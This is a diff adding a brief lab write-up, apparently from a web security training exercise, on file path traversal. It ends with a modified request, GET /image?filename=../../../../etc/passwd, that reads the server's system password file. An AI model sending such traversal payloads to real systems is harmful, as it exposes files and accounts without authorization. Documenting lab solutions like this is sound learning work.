@@ -1,0 +1,15 @@
+Lab #1: File path traversal, simple case
+
+Target: Get access to the content of /etc/passwd
+
+Analysis:
+
+The image files are loaded with Get request:
+
+GET /image?filename=72.jpg
+
+send the request to the repeater and change the filename parameter as follows:
+
+GET /image?filename=../../../../etc/passwd 
+
+
